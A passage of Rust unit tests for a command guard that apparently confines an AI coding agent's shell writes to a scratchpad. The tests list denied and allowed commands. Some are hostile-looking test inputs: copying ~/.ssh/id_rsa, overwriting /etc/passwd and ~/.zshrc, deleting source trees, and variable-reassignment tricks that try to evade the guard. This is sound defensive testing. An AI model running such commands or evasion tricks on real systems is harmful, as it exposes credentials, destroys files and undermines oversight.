                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None)
                    .is_some(),
                "{command}"
            );
        }
        for command in [
            "git show HEAD | git apply",
            "git diff-tree -p HEAD | git apply",
            "git log -p -1 | git apply",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
    }

    /// Issue #334, MAJOR review fix: the guard used to only know the
    /// launch repo's own root, so an absolute target in a SIBLING
    /// checkout/linked worktree of a different repository sailed through
    /// unrecognized. `repo_root_of` is now consulted per target, so a
    /// sibling repo's own file is caught even though it is nowhere near
    /// `cwd`.
    #[test]
    fn orchestrator_repo_write_target_catches_a_sibling_checkouts_own_files_too() {
        let cwd = "/work/repo";
        let command = "cp /tmp/claude-501/x /work/sibling/src/a.rs";
        assert_eq!(
            orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
            Some("/work/sibling/src/a.rs".to_string())
        );
    }

    /// The other half: a sibling repo's OWN `.zirv/work`/`.zirv/memory`
    /// still confines a write, exactly as the launch repo's own does --
    /// the allowed roots are resolved against WHICHEVER repo the target
    /// lands in, not hardcoded to the launch repo.
    #[test]
    fn orchestrator_repo_write_target_allows_a_sibling_checkouts_own_scratchpad() {
        let cwd = "/work/repo";
        for command in [
            "cp /tmp/claude-501/x /work/sibling/.zirv/work/o.txt",
            "echo x > /work/sibling/.zirv/memory/m.md",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
    }

    /// An absolute target that names no repository at all (per
    /// `repo_root_of`) is not a repository write -- there is no repo whose
    /// boundary it could be crossing.
    #[test]
    fn orchestrator_repo_write_target_allows_an_absolute_path_outside_any_known_repo() {
        let cwd = "/work/repo";
        let command = "cp /tmp/claude-501/x /elsewhere/not-a-repo/file.txt";
        assert_eq!(
            orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
            None
        );
    }

    /// The seat-guard verdict for `command` run from the repo root `/work/repo`.
    fn seat_hit(command: &str) -> Option<String> {
        orchestrator_repo_write_target(command, "/work/repo", &fake_repo_root_of, &|_| None)
    }

    /// Every command must be denied; the failure lists the ones that were not.
    fn assert_all_denied(commands: &[&str]) {
        let missed: Vec<&&str> = commands.iter().filter(|c| seat_hit(c).is_none()).collect();
        assert!(missed.is_empty(), "not denied: {missed:#?}");
    }

    /// Every command must stay allowed; the failure lists the ones denied.
    fn assert_all_allowed(commands: &[&str]) {
        let denied: Vec<String> = commands
            .iter()
            .filter_map(|c| seat_hit(c).map(|hit| format!("{c} -> {hit}")))
            .collect();
        assert!(denied.is_empty(), "wrongly denied: {denied:#?}");
    }

    #[test]
    fn seat_guard_denies_python_filesystem_writes_inline_and_in_heredocs() {
        assert_all_denied(&[
            "python3 -c \"import os; os.rename('src/a.py','src/b.py')\"",
            "python3 -c \"import os; os.replace('a','src/b')\"",
            "python3 -c \"import os; os.remove('src/a.py')\"",
            "python3 -c \"import os; os.unlink('src/a.py')\"",
            "python3 -c \"import os; os.truncate('src/a.py', 0)\"",
            "python3 -c \"import os; os.makedirs('src/new')\"",
            "python3 -c \"import os; os.mkdir('src/new')\"",
            "python3 -c \"import shutil; shutil.copy('/tmp/claude-501/a','src/b')\"",
            "python3 -c \"import shutil; shutil.rmtree('src')\"",
            "python3 -c \"from pathlib import Path; Path('src/x').unlink()\"",
            "python3 -c \"from pathlib import Path; Path('src/x').touch()\"",
            "python3 -c \"from pathlib import Path; Path('src/d').mkdir()\"",
            "python3 -c \"from pathlib import Path; Path('a').rename('src/b')\"",
            "python3 -c \"from pathlib import Path; Path('a').replace('src/b')\"",
            "python3 -c \"import fileinput\nfor l in fileinput.input('src/a.py', inplace=True): print(l)\"",
            "python3 -c \"import os,sys; os.remove(sys.argv[1])\"",
            "python3 -c \"from pathlib import Path; p = Path('x'); p.unlink()\"",
            "python3 - <<'EOF'\nimport os\nos.rename('src/a','src/b')\nEOF",
            "python3 - <<'EOF'\nimport shutil\nshutil.move('src/a','src/b')\nEOF",
            "python3 - <<'EOF'\nfrom pathlib import Path\nPath('src/a').unlink()\nEOF",
            "python3 - <<'EOF'\nimport os, sys\nos.remove(sys.argv[1])\nEOF",
        ]);
    }

    #[test]
    fn seat_guard_denies_node_filesystem_writes() {
        assert_all_denied(&[
            "node -e \"require('fs').renameSync('src/a','src/b')\"",
            "node -e \"require('fs').copyFileSync('/tmp/claude-501/x','src/b')\"",
            "node -e \"require('fs').rmSync('src/a')\"",
            "node -e \"require('fs').unlinkSync('src/a')\"",
            "node -e \"require('fs').mkdirSync('src/d')\"",
            "node -e \"require('fs').appendFileSync('src/a','x')\"",
            "node -e \"require('fs').createWriteStream('src/a')\"",
            "node -e \"require('fs').promises.rename('src/a','src/b')\"",
            "node -e \"require('fs/promises').rm('src/a')\"",
            "node - <<'EOF'\nrequire('fs').rmSync('src/a')\nEOF",
        ]);
    }

    #[test]
    fn seat_guard_screens_shell_strings_passed_to_interpreters() {
        assert_all_denied(&[
            "python3 -c \"import os; os.system('echo x > src/a.rs')\"",
            "python3 -c \"import subprocess; subprocess.run('echo x > src/a.rs', shell=True)\"",
            "python3 -c \"import subprocess; subprocess.run(['rm','src/a.rs'])\"",
            "python3 -c \"import subprocess; subprocess.run(['cp','a','src/b'])\"",
            "python3 -c \"import os; os.system(cmd)\"",
            "python3 -c \"import subprocess; subprocess.run(cmd)\"",
            "node -e \"require('child_process').execSync('rm src/a')\"",
            "node -e \"require('child_process').spawnSync('cp', ['a','src/b'])\"",
            "python3 - <<'EOF'\nimport os\nos.system('echo x > src/a.rs')\nEOF",
        ]);
    }

    #[test]
    fn seat_guard_keeps_read_only_and_out_of_repo_interpreter_code_allowed() {
        assert_all_allowed(&[
            "python3 -c \"import json; print(json.dumps({'a': 1}))\"",
            "python3 -c \"print('a-b'.replace('-','_'))\"",
            "python3 -c \"import os; print(os.listdir('.'))\"",
            "python3 -c \"import subprocess; subprocess.run(['git','log'])\"",
            "python3 -c \"import os; os.system('ls')\"",
            "python3 -c \"import os; os.rename('/tmp/claude-501/a','/tmp/claude-501/b')\"",
            "python3 -c \"from pathlib import Path; Path('/tmp/claude-501/x').write_text('hello')\"",
            "python3 -c \"import shutil; shutil.copy('/tmp/claude-501/a','/tmp/claude-501/b')\"",
            "python3 -c \"open('/work/repo/.zirv/work/o.txt','w').write('a')\"",
            "python3 -c \"import os; os.remove('/work/repo/.zirv/work/old.txt')\"",
            "node -e \"require('fs').copyFileSync('/tmp/claude-501/x','/tmp/claude-501/y')\"",
            "node -e \"console.log(require('fs').readFileSync('src/a','utf8'))\"",
            "python3 - <<'EOF'\nimport os\nprint(os.listdir('.'))\nEOF",
        ]);
    }

    /// Only the resolved target decides: naming `.zirv/work` in a comment or
    /// string must not exempt a write to the repository.
    #[test]
    fn seat_guard_exempts_by_resolved_target_not_by_text() {
        assert_all_denied(&[
            "python3 -c \"# /work/repo/.zirv/work\nimport os; os.remove('src/a')\"",
            "python3 -c \"import os; os.remove('src/a')  # /work/repo/.zirv/memory\"",
            "python3 -c \"print('/work/repo/.zirv/work'); open('src/a','w').write('x')\"",
            "python3 - <<'EOF'\n# /work/repo/.zirv/work\nopen('src/a','w').write('x')\nEOF",
            "python3 - <<'EOF'\nprint('/work/repo/.zirv/memory')\nimport os; os.remove('src/a')\nEOF",
        ]);
    }

    #[test]
    fn seat_guard_recurses_into_shell_wrappers_and_eval() {
        assert_all_denied(&[
            "bash -c 'echo x > src/a.rs'",
            "sh -c \"cp a src/b\"",
            "zsh -c 'touch src/a'",
            "env sh -c 'echo x > src/a'",
            "eval \"echo x > src/a\"",
            "eval echo x '>' src/a",
            "bash -c \"sh -c 'echo x > src/a'\"",
            "nohup sh -c 'echo x > src/a'",
        ]);
        assert_all_allowed(&[
            "bash -c 'echo hi'",
            "bash -c 'echo x > /tmp/claude-501/a'",
            "env sh -c 'ls'",
            "eval \"echo hi\"",
        ]);
    }

    #[test]
    fn seat_guard_denies_xargs_that_writes() {
        assert_all_denied(&[
            "find . -name x | xargs rm",
            "ls | xargs -0 rm -f",
            "ls | xargs cp -t /work/repo/src",
            "echo a | xargs tee src/a",
            "ls | xargs -I{} mv {} src/{}",
            "ls | xargs touch",
            "ls | xargs sed -i 's/a/b/'",
            "ls | xargs sh -c 'echo x > src/a'",
        ]);
        assert_all_allowed(&[
            "ls | xargs echo",
            "ls | xargs grep foo",
            "ls | xargs wc -l",
            "ls | xargs sed 's/a/b/'",
            "ls | xargs -I{} cp {} /tmp/claude-501/{}",
        ]);
    }

    #[test]
    fn seat_guard_denies_awk_redirects_and_system() {
        assert_all_denied(&[
            "awk '{print > \"src/a.txt\"}' f",
            "awk '{print >> \"src/a.txt\"}' f",
            "awk 'BEGIN{system(\"rm src/a\")}'",
            "awk '{print | \"tee src/a\"}' f",
            "awk '{print > $1}' f",
            "awk '{printf \"%s\\n\", $1 > \"src/a.txt\"}' f",
            "gawk -i inplace '{print}' src/a.txt",
        ]);
        assert_all_allowed(&[
            "awk '$1 > 5 {print $1}' f",
            "awk '{print}' f",
            "awk '{print > \"/tmp/claude-501/a\"}' f",
            "awk 'BEGIN{system(\"ls\")}'",
            "awk '{ if ($1 > 2) print $1 }' f",
        ]);
    }

    #[test]
    fn seat_guard_denies_sed_write_commands() {
        assert_all_denied(&[
            "sed -n 'w src/a.txt' f",
            "sed 's/a/b/w src/a.txt' f",
            "sed -e '/x/w src/o' f",
            "sed 'W src/o' f",
            "sed -n '/a/{p;w src/o\n}' f",
        ]);
        assert_all_allowed(&[
            "sed -n '1,5p' f",
            "sed 's/a/b/' f",
            "sed 's/w/x/g' f",
            "sed -n '/w/p' f",
            "sed -n 'w /tmp/claude-501/o' f",
            "sed 's/a/b/w /tmp/claude-501/o' f",
        ]);
    }

    #[test]
    fn seat_guard_resolves_pwd_spellings_to_the_repo() {
        assert_all_denied(&[
            "echo x > $PWD/src/a.rs",
            "echo x > ${PWD}/a",
            "echo x > $(pwd)/a",
            "echo x > `pwd`/a",
            "touch $PWD/a",
            "cp a $PWD/b",
            "echo x | tee $PWD/a",
            "echo x > \"$PWD/a\"",
        ]);
        assert_all_allowed(&[
            "echo $PWD",
            "echo x > /tmp/claude-501/$USER",
            "cd /tmp/claude-501 && echo x > $PWD/a",
        ]);
    }

    #[test]
    fn seat_guard_resolves_node_targets_like_python() {
        assert_all_allowed(&[
            "node -e \"require('fs').writeFileSync('/tmp/claude-501/x','y')\"",
            "node -e \"require('fs').writeFileSync('/tmp/x','y')\"",
            "node -e \"require('fs').appendFileSync('/tmp/x','y')\"",
            "node -e \"require('fs').promises.writeFile('/tmp/x','y')\"",
            "node - <<'EOF'\nrequire('fs').writeFileSync('/tmp/claude-501/x','y')\nEOF",
        ]);
        assert_all_denied(&[
            "node -e \"require('fs').writeFileSync('src/x','y')\"",
            "node -e \"require('fs').writeFileSync('/tmp/x','y'); require('fs').writeFileSync('src/x','y')\"",
            "node - <<'EOF'\nrequire('fs').writeFileSync('src/x','y')\nEOF",
        ]);
    }

    #[test]
    fn seat_guard_normalizes_dotdot_after_pwd_substitution() {
        assert_all_allowed(&[
            "cp src/main.rs $PWD/../x",
            "echo x > $PWD/../x",
            "cp src/main.rs \"$PWD\"/../x",
        ]);
        assert_all_denied(&["echo x > $PWD/sub/../a", "cp a $PWD/../repo/src/b"]);
    }

    /// The same on a real checkout: `$PWD/..` lands beside the repo, not in it.
    #[test]
    fn seat_guard_pwd_dotdot_on_a_real_checkout_is_outside_the_repo() {
        let root = tempfile::tempdir().expect("tempdir");
        let repo = root.path().join("repo");
        std::fs::create_dir_all(repo.join(".git")).expect("git marker");
        std::fs::create_dir_all(repo.join("src")).expect("src");
        let cwd = repo.to_string_lossy().replace('\\', "/");
        for (command, denied) in [
            ("cp src/main.rs $PWD/../x", false),
            ("echo x > ${PWD}/../x", false),
            ("echo x > $PWD/../repo/src/x", true),
            ("cp src/main.rs $PWD/src/x", true),
        ] {
            let hit =
                orchestrator_repo_write_target(command, &cwd, &filesystem_repo_root_of, &|_| None);
            assert_eq!(hit.is_some(), denied, "{command}: {hit:?}");
        }
    }

    #[test]
    fn seat_guard_screens_xargs_targets_past_redirects_and_shell_payloads() {
        assert_all_denied(&[
            "xargs -I{} cp {} src/main.rs < /dev/null",
            "xargs sh -c 'echo x > src/main.rs' < /dev/null",
            "xargs bash -c 'echo x > src/main.rs' < /dev/null",
            "xargs -n1 zsh -c 'touch src/main.rs' < /dev/null",
            "cp a src/b 2>&1",
            "mv a src/b < /dev/null",
        ]);
        assert_all_allowed(&[
            "xargs -I{} cp {} /tmp/claude-501/x < /dev/null",
            "xargs sh -c 'echo hi' < /dev/null",
            "cp a /tmp/claude-501/b 2>&1",
        ]);
    }

    #[test]
    fn seat_guard_denies_perl_and_ruby_writes() {
        assert_all_denied(&[
            "perl -e 'unlink(\"src/main.rs\")'",
            "perl -e 'unlink \"src/main.rs\"'",
            "perl -e 'open(F,\">src/main.rs\")'",
            "perl -e 'open(my $fh, \">>\", \"src/a\")'",
            "perl -e 'rename(\"a\",\"src/b\")'",
            "perl -e 'mkdir(\"src/d\")'",
            "perl -e 'system(\"echo x > src/a\")'",
            "perl -e 'system \"rm src/a\"'",
            "perl -e 'system(\"rm\", \"src/a\")'",
            "perl -e 'print `rm src/a`'",
            "perl -e 'qx{rm src/a}'",
            "perl -e 'system($cmd)'",
            "perl -pi -e 's/a/b/' src/main.rs",
            "perl -i.bak -pe 's/a/b/' src/main.rs",
            "perl -pi -e 's/a/b/' $PWD/src/main.rs",
            "perl <<'EOF'\nunlink(\"src/a\");\nEOF",
            "ruby -e 'File.write(\"src/a\",\"x\")'",
            "ruby -e 'File.open(\"src/a\",\"w\") { |f| f.puts 1 }'",
            "ruby -e 'require \"fileutils\"; FileUtils.rm(\"src/a\")'",
            "ruby -e 'system(\"rm src/a\")'",
            "ruby -e 'system \"rm src/a\"'",
            "ruby -e 'puts `rm src/a`'",
            "ruby -i -pe '$_.upcase!' src/main.rs",
            "ruby -pi -e '$_.upcase!' src/main.rs",
            "ruby <<'EOF'\nFile.write('src/a','x')\nEOF",
        ]);
        assert_all_allowed(&[
            "perl -e 'print \"hi\\n\"'",
            "perl -ne 'print if /a/' src/main.rs",
            "perl -e 'unlink(\"/tmp/claude-501/x\")'",
            "perl -e 'open(F,\">/tmp/claude-501/x\")'",
            "perl -e 'open(F,\"<src/main.rs\")'",
            "perl -e 'system(\"ls\")'",
            "perl -pi -e 's/a/b/' /tmp/claude-501/x",
            "perl -i -pe 's/a/b/' /tmp/claude-501/x",
            "ruby -e 'puts 1'",
            "ruby -e 'File.write(\"/tmp/claude-501/x\",\"y\")'",
            "ruby -e 'puts File.read(\"src/a\")'",
        ]);
    }

    #[test]
    fn seat_guard_covers_output_file_flags() {
        assert_all_denied(&[
            "sort -o src/a f",
            "sort f --output=src/a",
            "curl -o src/a http://x",
            "curl --output src/a http://x",
            "curl -O http://x/f",
            "curl -sSLo src/a http://x",
            "wget -O src/a http://x",
            "wget --output-document=src/a http://x",
            "wget http://x/f",
            "wget -P src http://x",
            "tar xzf a.tgz -C src",
            "tar -xf a.tar --directory=src",
            "tar xf a.tar",
            "tar czf src/a.tgz x",
            "unzip -d src a.zip",
            "unzip a.zip",
            "unzip -o a.zip",
            "python3 -c \"import urllib.request; urllib.request.urlretrieve('http://x','src/a')\"",
            "python3 -c \"import urllib.request; urllib.request.urlretrieve(u, 'src/a')\"",
            "python3 -c \"import urllib.request; urllib.request.urlretrieve('http://x', p)\"",
            "python3 -c \"import zipfile; zipfile.ZipFile('/tmp/a.zip').extractall('src')\"",
            "python3 -c \"import zipfile; zipfile.ZipFile('/tmp/a.zip').extractall()\"",
        ]);
        assert_all_allowed(&[
            "sort -o /tmp/claude-501/o f",
            "sort f",
            "curl -o /tmp/claude-501/a http://x",
            "curl http://x",
            "curl -o - http://x",
            "wget -O /tmp/claude-501/a http://x",
            "wget -O- http://x",
            "tar xzf a.tgz -C /tmp/claude-501/x",
            "tar tf a.tar",
            "tar xf a.tar -O",
            "tar czf /tmp/claude-501/a.tgz src",
            "unzip -l a.zip",
            "unzip -d /tmp/claude-501/x a.zip",
            "cd /tmp/claude-501 && unzip a.zip",
            "cd /tmp/claude-501 && tar xf a.tar",
            "cd /tmp/claude-501 && wget http://x",
            "cd /tmp/claude-501 && curl -O http://x",
            "python3 -c \"import urllib.request; urllib.request.urlretrieve('http://x','/tmp/claude-501/a')\"",
            "python3 -c \"import zipfile; zipfile.ZipFile('/tmp/a.zip').extractall('/tmp/claude-501/x')\"",
        ]);
    }

    /// `filesystem_repo_root_of` walks up from a target's PARENT (the
    /// target itself need not exist yet) until it finds a `.git` entry --
    /// here, two directories up.
    #[test]
    fn filesystem_repo_root_of_walks_up_to_the_nearest_git_marker() {
        let root = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(root.path().join(".git")).expect("git marker");
        let nested = root.path().join("src").join("nested");
        std::fs::create_dir_all(&nested).expect("mkdir nested");
        let target = nested.join("file.rs");
        let target_str = target.to_string_lossy().replace('\\', "/");

        let found = filesystem_repo_root_of(&target_str).expect("finds the repo root");
        let expected = root
            .path()
            .to_string_lossy()
            .replace('\\', "/")
            .trim_end_matches('/')
            .to_string();
        assert_eq!(found, expected);
    }

    #[test]
    fn a_scratchpad_confined_compound_allows_headlessly_even_unmatched() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        let scratchpad = scratchpad_write_root(&std::env::temp_dir());
        let command = format!("some-totally-unknown-tool --flag > {scratchpad}/out.log");
        let stdin = format!(
            r#"{{"tool_name":"Bash","tool_input":{{"command":"{command}"}},"permission_mode":"dontAsk"}}"#
        );
        let mut out = Vec::new();
        run_check_hook_mode(&cfg, &mut out, &stdin).expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            !text.contains(r#""permissionDecision":"ask""#) && !text.contains("deny"),
            "a scratchpad-confined write from an otherwise-unmatched command must not prompt: got {text}"
        );
    }

    #[test]
    fn a_scratchpad_confined_compound_survives_an_unsandboxed_retry() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        let scratchpad = scratchpad_write_root(&std::env::temp_dir());
        let command = format!("grep -r TODO . > {scratchpad}/todos.log");
        let stdin = format!(
            r#"{{"tool_name":"Bash","tool_input":{{"command":"{command}","dangerouslyDisableSandbox":true}},"permission_mode":"default"}}"#
        );
        let mut out = Vec::new();
        run_check_hook_mode(&cfg, &mut out, &stdin).expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            text.contains(r#""permissionDecision":"allow""#),
            "got {text}"
        );
        assert!(!text.contains("unsandboxed retry"), "got {text}");
    }

    #[cfg(unix)]
    #[test]
    fn a_real_claude_scratchpad_write_allows_headlessly_even_unmatched() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        let scratchpad = real_claude_scratchpad_root();
        let command =
            format!("some-unknown-tool --flag > {scratchpad}/enc/sess/scratchpad/out.log");
        let state = tempfile::tempdir().expect("state");
        let env = env_from(&[(
            super::super::state::STATE_ENV,
            state.path().to_str().expect("utf8 state"),
        )]);
        let stdin = serde_json::json!({
            "session_id": "real-scratchpad-write",
            "tool_name": "Bash",
            "tool_input": { "command": command },
            "permission_mode": "dontAsk"
        })
        .to_string();
        let mut out = Vec::new();
        run_check_hook_mode_with_env(&cfg, &mut out, &stdin, &|key| env.get(key).cloned())
            .expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(text.is_empty(), "got {text}");
        let audit_dir = state.path().join("logs/safety-decisions");
        let audit_path = std::fs::read_dir(audit_dir)
            .expect("audit dir")
            .next()
            .expect("one audit file")
            .expect("audit entry")
            .path();
        let audit = std::fs::read_to_string(audit_path).expect("audit");
        assert!(
            audit.contains(r#""verdict":"allow""#)
                && audit.contains("<scratchpad: confined write>"),
            "{audit}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_cd_into_a_real_claude_scratchpad_allows_an_unsandboxed_git_retry() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        let scratchpad = real_claude_scratchpad_root();
        let command = format!("cd {scratchpad}/enc/sess/scratchpad/repo && git status --short");
        let stdin = serde_json::json!({
            "tool_name": "Bash",
            "tool_input": {
                "command": command,
                "dangerouslyDisableSandbox": true
            },
            "permission_mode": "default"
        })
        .to_string();
        let mut out = Vec::new();
        run_check_hook_mode(&cfg, &mut out, &stdin).expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            text.contains(r#""permissionDecision":"allow""#),
            "got {text}"
        );
        assert!(!text.contains("unsandboxed retry"), "got {text}");
    }

    #[cfg(unix)]
    #[test]
    fn a_confined_scratchpad_write_with_read_only_gh_survives_an_unsandboxed_retry() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        let scratchpad = real_claude_scratchpad_root();
        let command = format!(
            "mkdir -p {scratchpad}/enc/sess/scratchpad/issues && gh issue view 264 --repo o/r --json title,body > {scratchpad}/enc/sess/scratchpad/issues/TEMPLATE.md"
        );
        let stdin = serde_json::json!({
            "tool_name": "Bash",
            "tool_input": {
                "command": command,
                "dangerouslyDisableSandbox": true
            },
            "permission_mode": "default"
        })
        .to_string();
        let mut out = Vec::new();
        run_check_hook_mode(&cfg, &mut out, &stdin).expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(text.contains("<scratchpad: confined write>"), "got {text}");
        assert!(
            text.contains(r#""permissionDecision":"allow""#),
            "got {text}"
        );
    }

    #[test]
    fn a_write_outside_the_scratchpad_still_escalates_even_if_otherwise_unmatched() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        // An empty mode is headless and still emits Ask; dontAsk would
        // suppress it, while auto now uses the interactive default.
        let stdin = r#"{"tool_name":"Bash","tool_input":{"command":"some-totally-unknown-tool > /etc/passwd"},"permission_mode":""}"#;
        let mut out = Vec::new();
        run_check_hook_mode(&cfg, &mut out, stdin).expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(text.contains(r#""permissionDecision":"ask""#), "got {text}");
    }

    #[test]
    fn literal_assignment_scratchpad_writes_allow_sandboxed_and_on_retry() {
        let scratch = scratchpad_write_root(&std::env::temp_dir());
        for command in [
            format!(
                r#"S={scratch}/x; ZIRV_CTX_FALLBACK=false zirv agent codex - --workdir /tmp/wt -- --model gpt-6-astra < $S/r.md > $S/o.out 2> $S/e.err; echo "exit=$?"; cat $S/o.out"#
            ),
            format!(
                r#"LOGF="{scratch}/x/scratchpad/l.log"; cargo test > "$LOGF" 2>&1; tail -3 "$LOGF""#
            ),
            format!(
                r#"OUT="{scratch}/x/scratchpad/g"; WT="/work/wt-jev-tier"; cargo fmt --manifest-path "$WT/Cargo.toml" -- --check > "$OUT/01-fmt.log" 2>&1; echo "FMT_EXIT=$?" | tee -a "$OUT/exit-codes.txt""#
            ),
            format!(
                r#"export S='{scratch}/logs with ; spaces'; mkdir -p "$S"; echo ok | tee -a "${{S}}/out""#
            ),
        ] {
            for retry in [false, true] {
                let output = literal_retry_hook(&command, retry, "/work/repo");
                assert_eq!(output["permissionDecision"], "allow", "{command}: {output}");
                assert!(
                    output["permissionDecisionReason"]
                        .as_str()
                        .unwrap()
                        .contains("<scratchpad: confined write>"),
                    "{command}: {output}"
                );
            }
        }
    }

    #[test]
    fn tee_and_mkdir_do_not_treat_redirect_operands_as_path_arguments() {
        let scratch = scratchpad_write_root(&std::env::temp_dir());
        for command in [
            format!(r#"S={scratch}/x; tee -a "$S/out" < /tmp/input 2>"$S/errors""#),
            format!(r#"S={scratch}/x; mkdir -p "$S/new" 0</tmp/input > "$S/log""#),
        ] {
            let output = literal_retry_hook(&command, true, "/work/repo");
            assert_eq!(output["permissionDecision"], "allow", "{command}: {output}");
            assert!(
                output["permissionDecisionReason"]
                    .as_str()
                    .unwrap()
                    .contains("<scratchpad: confined write>"),
                "{output}"
            );
        }
        assert_eq!(
            segment_redirect_targets("tee '>unconfined' < /tmp/input"),
            Some(vec![">unconfined".to_string()])
        );
    }

    #[test]
    fn literal_assignment_retry_keeps_unconfined_tainted_and_credential_targets_blocked() {
        let scratch = scratchpad_write_root(&std::env::temp_dir());
        // `S=$HOME/x; echo y > $S/z` left this list and the `S=$HOME`
        // reassignment now writes a startup file: an ordinary user directory
        // is not a protected path, so a retry may write it.
        for command in [
            "S=/etc; echo x > $S/passwd".to_string(),
            format!("S={scratch}; cat ~/.ssh/id_rsa > $S/k"),
            format!("S={scratch}; S=/etc; echo x > $S/passwd"),
            format!("S={scratch}; S=$HOME; echo x > $S/.zshrc"),
            format!("S={scratch}; cat /dev/null > /etc/passwd"),
        ] {
            let output = literal_retry_hook(&command, true, "/work/repo");
            assert_ne!(output["permissionDecision"], "allow", "{command}: {output}");
            assert!(
                !output["permissionDecisionReason"]
                    .as_str()
                    .unwrap()
                    .contains("<scratchpad: confined write>"),
                "{output}"
            );
        }
    }

    #[test]
    fn literal_assignments_are_ordered_and_do_not_guess_shell_scope_or_expansions() {
        let roots = vec!["/scratch".to_string()];
        for command in [
            "echo x > $S/out; S=/scratch",
            "S=/scratch; T=$S; echo x > $T/out",
            "S=/scratch echo x > $S/out",
            "false && S=/scratch; echo x > $S/out",
            "S=/scratch | cat; echo x > $S/out",
            "S=/scratch; read S; echo x > $S/out",
            "S=/scratch; S+=/../../etc; echo x > $S/out",
            "S=/scratch; printf -v S /etc; echo x > $S/out",
            "S=/scratch; export S=/etc OTHER; echo x > $S/out",
            "S=/scratch; readonly S=/etc; echo x > $S/out",
            "S=/scratch; S[0]=/etc; echo x > $S/out",
            "S=/scratch; builtin read S; echo x > $S/out",
            "S=/scratch; for S in /etc; do echo x > $S/out; done",
            "S=/scratch; echo x > '$S/out'",
            "S=/scratch; echo $(S=/etc; echo x > $S/out)",
            "S=/scratch; echo x > ${S:-/etc}/out",
            "S='/scratch/*'; echo x > $S/out",
        ] {
            assert_ne!(
                write_targets_confined(command, &roots),
                Some(true),
                "{command}"
            );
        }
        assert_eq!(
            write_targets_confined("S=/scratch; echo x > ${S}/out", &roots),
            Some(true)
        );
        assert_eq!(
            write_targets_confined(
                "export S='/scratch/logs';\necho x >> \"$S/out\" 2>/dev/null",
                &roots
            ),
            Some(true)
        );
    }

    #[test]
    fn literal_assignment_mutations_never_prove_scratchpad_or_cwd_confinement() {
        let scratch = scratchpad_write_root(&std::env::temp_dir());
        for root in [&scratch, "/work/repo"] {
            for mutation in [
                "f(){ S=/etc; }; f",
                "function f { S=/etc; }; f",
                "f () { S=/etc; }; f",
                "trap 'S=/etc' DEBUG",
                "command trap 'S=/etc' DEBUG",
                "'eval' 'S=/etc'",
                "e\\val 'S=/etc'",
                "source /tmp/change-vars.sh",
                ". /tmp/change-vars.sh",
                "builtin read S",
                "</tmp/input read S",
                "</tmp/input builtin read S",
                "</tmp/input command read S",
                "2>/dev/null read S < /tmp/input",
                "unset S; S=/etc",
                "declare S=/etc",
                "local S=/etc",
                "typeset S=/etc",
                "let S=1",
                "((S=1))",
                "for S in /etc; do true; done",
                "select S in /etc; do break; done",
                "printf -vS /etc",
                ": ${OTHER:=${S:=/etc}}",
                ": \"${OTHER:=${S:=/etc}}\"",
                "echo \"$(S=/etc; echo x > $S/passwd)\"",
                "$MUTATOR S",
                "{read,} S",
                "S=/etc",
                "S+=/../../etc",
                "S[0]=/etc",
            ] {
                let command = format!("S={root}; {mutation}; echo x > $S/passwd");
                assert_ne!(
                    write_targets_confined(&command, std::slice::from_ref(&scratch)),
                    Some(true),
                    "{command}"
                );
                assert!(
                    !redirects_confined_for_retry(&command, &[], Some(Path::new("/work/repo"))),
                    "{command}"
                );
                let output = literal_retry_hook(&command, true, "/work/repo");
                assert_ne!(output["permissionDecision"], "allow", "{command}: {output}");
            }
        }
    }

    #[test]
    fn literal_assignment_resolution_preserves_quoted_formatter_data() {
        let scratch = scratchpad_write_root(&std::env::temp_dir());
        for tail in [
            r#"printf 'report (%s)\n' ok > "$S/out"; grep -E '^\s+Summary' "$S/out""#,
            r#"printf "report (%s)\n" ok > "$S/out"; awk '{print $NF}' "$S/out""#,
            r#"echo '${S:=/etc} $(ignored) `ignored`' > "$S/out""#,
        ] {
            let command = format!("S={scratch}; {tail}");
            let output = literal_retry_hook(&command, true, "/work/repo");
            assert_eq!(output["permissionDecision"], "allow", "{command}: {output}");
            assert!(
                output["permissionDecisionReason"]
